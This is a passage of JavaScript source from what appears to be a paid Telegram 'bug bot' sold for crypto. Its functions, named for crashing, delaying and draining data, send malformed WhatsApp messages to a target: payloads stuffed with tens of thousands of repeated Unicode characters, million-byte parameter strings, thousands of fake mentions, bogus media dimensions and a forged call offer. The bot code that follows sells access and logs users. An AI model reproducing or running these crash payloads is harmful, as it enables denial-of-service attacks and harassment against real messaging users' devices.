              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: X,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
        },
      },
    },
  }, {});
  
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: StickerPayload.message,
     },
    },
    { 
      messageId: StickerPayload.key.id, 
      participant: { jid: X },
    }
  );
}                        

async function delaybeta(client, X) {
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "\u0000"
  };

  let software = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { imageMessage: imageMsg }
          ],
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            forwardedNewsletterMessageInfo: {
              newsletterName: "...",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            },
            eventCoverImage: {
              eventId: Date.now() + 1814400000,
              eventName: "Kountol",
              eventDescription: "ꦽ".repeat(20000),
              startTime: 9999999999,
              endTime: 99999999999,
              eventCoverMedia: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                caption: "ោ៝".repeat(20000),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHipotKC0qPTgzMzg9UJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k="
              },
              eventLocation: {
                name: ">#NortexZ",
                address: "ោ៝".repeat(20000),
                degreesLatitude: -922.99999999,
                degreesLongitude: 922.999999999999,
                url: "https://t.me/NortexZ"
              },
              eventParticipants: {
                participants: [{ jid: X, displayName: "Participant" }]
              },
              eventStatus: "@MarkZugasu",
              eventOptions: {
                isAnonymous: true,
                canGuestsInvite: true,
                canSeeGuestList: true,
                maxParticipants: 9999999999,
                requiresApproval: false,
                customField1: "HI!",
                customField2: "HI!"
              },
              eventMetadata: JSON.stringify({
                heavy_data: "ACCOUNTS",
                nested: {
                  level1: "X".repeat(546),
                  level2: {
                    level3: "X".repeat(546),
                    level4: {
                      level5: "X".repeat(546),
                      array_data: Array(100).fill().map(() => ({
                        item: "Memeks",
                        details: "X"
                      }))
                    }
                  }
                }
              }),
              binaryData: "\u0081".repeat(0x7000)
            }
          }
        }
      }
    }
  }, {});

  await client.relayMessage("status@broadcast", software.message, {
        messageId: software.key.id,
        statusJidList: [X],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: X },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    console.log("cihuy");
}

async function ZenoDrainKuota(client, X, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(X, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: X,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: X } 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: X } 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: X } 
    } : { messageId: payload2.key.id }
  );
}

async function XoipFc(client, X, ptcp = true) {
let msg = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.9996311899,
          name: "🧪⃟꙰ 𝗫𝗜𝗡𝗦𝗢𝗢𝗩𝟭𝟮" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
          address: "🧪⃟꙰ 𝗫𝗜𝗡𝗦𝗢𝗢𝗩𝟭𝟮" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
          url: `https://zeno-iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
        },
      },
    },
  }, {});
    
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id,
      participant: { jid: X }
    } : { messageId: msg.key.id }
  );
  await sleep(5000);
}

async function XoipCrash(client, X) {
  try {
    const LocX = {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "#Xinsoo" + "𑇂𑆵𑆴𑆿".repeat(15000),
        url: "https://t.me/adji_pgstu_dev",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1",
                },
              ],
            },
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: "X",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZAQABAAD/",
              caption: "𑇂𑆵𑆴𑆿".repeat(15000),
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "CrashIosInvisible",
            },
          },
        },
      },
    };

    await client.relayMessage("status@broadcast", LocX, {
      messageId: LocX.key?.id || undefined,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: X },
                },
              ],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.error(err);
  }
}

     async function Occolot(client, X) {
  const msg = generateWAMessageFromContent(
    X,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "— ϟ ˙",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson:
            `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    },
    { userJid: X }
  );

  await client.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [X, "13135550002@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: X },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function autosync(client, X) {
    try {
    let devices = (
        await client.getUSyncDevices([X], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await client.assertSessions(devices);

    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();
    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let originalCreateParticipantNodes = client.createParticipantNodes.bind(client);
    let encodeMsg = client.encodeWAMessage?.bind(client);

    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let mapped = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = client.authState.creds.me;
        let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
            let { user: targetUser } = jidDecode(jid);
            let { user: ownPnUser } = jidDecode(meId);
            let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
            let isSelf = jid === meId || jid === meLid;

            if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

            let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

            return mutexManager.mutex(jid, async () => {
                let { type, ciphertext } = await client.signalRepository.encryptMessage({ jid, data: bytes });
                if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                return {
                    tag: 'to',
                    attrs: { jid },
                    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                };
            });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
        await client.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
        tag: "call",
        attrs: { to: X, id: client.generateMessageTag(), from: client.user.id },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": client.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
                    }]
                    : [])
            ]
        }]
    };

    await client.sendNode(callNode);
    
         } catch (err) {
            console.error(err);
         }
         
        };


async function BuldozerCombine(client, X, ptcp = true) {
  const VariabelJid = "0@s.whatsapp.net";
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "\u0000".repeat(104500),
  };

  let msg = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { 
              imageMessage: imageMsg 
            }
          ],
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, 
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            businessMessageForwardInfo: {
              businessOwnerJid: VariabelJid,
            },
          },
        },
      },
    },
  }, {});
  
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: X } 
    } : { messageId: msg.key.id }
  );
  
  const payload = generateWAMessageFromContent(C, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: X } 
    } : { messageId: payload.key.id }
  );
}

/**
 * kalo mau botnya di buat private ubah disini aja
 * ini gua akses ke publik biar bisa di gunain di channel sama group
 */

bot.use(async (ctx, next) => {
  try {
    await next();
  } catch (err) {
    log.error(`Middleware error: ${err.message}`);
    try {
      await bot.api.sendMessage(
        config.ownerId,
        `An error occurred: ${err.message}`
      );
    } catch {}
  }
});

bot.use(async (ctx, next) => {
  try {
    if (ctx.chat?.type === "private") {
      const userPath = path.join("database", "users.json");
      const users = fs.existsSync(userPath)
        ? JSON.parse(fs.readFileSync(userPath, "utf8"))
        : [];
      const id = ctx.from.id.toString();
      const username = ctx.from.username
        ? `@${ctx.from.username}`
        : ctx.from.first_name || "Unknown";

      if (!users.includes(id)) {
        users.push(id);
        fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
        log.user(`New user registered: ${id} (${username})`);
        try {
          await bot.api.sendDocument(config.ownerId, new InputFile(userPath), {
            caption: `👤 *New User Registered!*\n\n🆔 ID: \`${id}\`\n💬 Username: ${username}\n📅 Time: ${new Date().toLocaleString()}`,
            parse_mode: "Markdown",
          });
        } catch {}
      }
    }
    await next();
  } catch (err) {
    log.error(`Register middleware error: ${err.message}`);
  }
});
bot.use(async (ctx, next) => {
  try {
    if (!ctx.chat || ctx.chat.type !== "private") return;

    const memberChannel = await ctx.api
      .getChatMember(CHANNEL_ID, ctx.from.id)
      .catch(() => null);
    const memberGroup = await ctx.api
      .getChatMember(GROUP_ID, ctx.from.id)
      .catch(() => null);
    const imageMenu = config.thumburl;

    if (
      !memberChannel ||
      ["left", "kicked"].includes(memberChannel.status) ||
      !memberGroup ||
      ["left", "kicked"].includes(memberGroup.status)
    ) {
      const keyboard = new InlineKeyboard()
        .url("📢 Join Channel", `https://t.me/${CHANNEL_ID.replace("@t.me/Notfound_Comander", "")}`)
        .row()
        .url("✉ Join Group", `https://t.me/${GROUP_ID.replace("@NOTfound_COMANDERr", "")}`)
        .row()
        .url("📱 Follow Wahatsapp", "https://whatsapp.com/channel/0029Vb7t4UAFi8xjNTHgjl3P")
        .row()
        .url("🎵 Follow TikTok", "https://www.tiktok.com/@xcomanderxx?_r=1&_t=ZS-97QrITuhKPi")
        .row()
        .url("🎥 Subscribe Youtube", "https://youtube.com/@commander-g1k?si=UXW64q6lcvdolDyi");

      return await ctx.replyWithPhoto(imageMenu, {
        caption: `
⚠️ *Access Denied*

Hello, ${ctx.from.first_name} 👋
To unlock all features of this bot, you need to complete a few verification steps first.

🔐 Mandatory Access Requirements

 > Join the Telegram Channel
 > Join the Telegram Group
 > Follow TikTok
 > Follow Whatsapp channel
 > Subscribe Youtube Channel 

Once all steps are completed, please send /start to continue.
Thank you for supporting us 🤍
            `.trim(),
        parse_mode: "Markdown",
        reply_markup: keyboard,
      });
    }

    await next();
  } catch (err) {
    log.error(`Cek wajib join error: ${err.message}`);
    await ctx.reply(
      "⚠️ Error memverifikasi join channel/group, coba lagi nanti."
    );
  }
});



bot.on("message", async (ctx) => {
  try {
    if (!ctx.message.text || !ctx.message.text.startsWith("/")) return;
    const [command, ...args] = ctx.message.text.slice(1).split(" ");
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name;
    log.info(
      `Command received: ${chalk.yellow(`/${command}`)} from ${chalk.cyan(
        `@${username}`
      )}`
    ); 
    if (!hasAccess(userId)) {
    return ctx.reply(`🔒 PREMIUM BOT ACTIVE
    
🚀 PREMIUM ACCESS REQUIRED
━━━━━━━━━━━━━━━━━━
[EN] This bot is restricted to premium users only.
[EG] البوت حالياً متاح فقط للمشتركين المميزين.

📊 SELECT YOUR PLAN | اختر خطتك المناسبة
━━━━━━━━━━━━━━━━━━
🔹 MONTHLY ACCESS | اشتراك شهري
💰 Price: $4 | 200 EGP
✅ Full Features + Updates
✅ Priority Support

🔹 FULL SCRIPT | سكربت البوت كاملاً
💰 Price: $15 | 750 EGP
✅ 100% No Encryption (Source Code)
✅ Own the Bot + Lifetime Updates
━━━━━━━━━━━━━━━━━━
🌍 PAYMENT METHODS | طرق الدفع
💎 Global: All Cryptocurrencies 
(USDT, BTC, etc.)

🇪🇬 Egypt: Vodafone Cash / InstaPay
━━━━━━━━━━━━━━━━━━
📩 CONTACT ADMIN TO BUY | تواصل للشراء
👤 Developer: @XComanderx


 ━━━━━━━━━━━━━━━━━━
🌍 PAYMENT METHODS | طرق الدفع
💎 Global: All major platforms supported (Bybit, Binance, KuCoin, etc.)
💎 العملات الرقمية: نوفر جميع خدمات الدفع عبر منصات (Bybit - Binance-Kust)

 ━━━━━━━━━━━━━━━━━━`);
  }
    switch (command) {
      case "start": {
        const username = ctx.from.username
          ? `@${ctx.from.username}`
          : ctx.from.first_name;
        const uptime = formatUptime(process.uptime());
        const usedMemory = (
          process.memoryUsage().heapUsed /
          1024 /
          1024
        ).toFixed(2);

        const caption = `<blockquote>
<b><i>{❓} Xzeso bot bug say hello ${username}</i></b>

<b>【Comander VIP Control v1.0】 🎮
───══════════════════───
➤ User    : ${username} 👤
➤ Dev     : @XComanderx 👨‍💻
➤ Time    : ${uptime} ⏱️
➤ Ram     : ${usedMemory} 💾
➤ Status  : 🟢 Plugin Active ✅
───══════════════════───

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @XComanderx for assistance
</blockquote>`.trim();

        const keyboard = new InlineKeyboard()
  .text("MENU BUG", "open_allmenu")
  .text("OWNER BUG", "open_allaccess")
  .row()
  .url("CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

        const imageMenu = config.thumburl;

        if (thumbnail) {
          await ctx.replyWithPhoto(imageMenu, {
            caption,
            parse_mode: "HTML",
            reply_markup: keyboard,
          });
        } else {
          await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: keyboard,
          });
        }

        log.success(`Start command executed for ${username}`);
        break;
      }

      /**
       * contoh command bug
       * sesuaikan dengan style mu aja mau ubah kek mana
       */

      case "clearsender": {
        try {
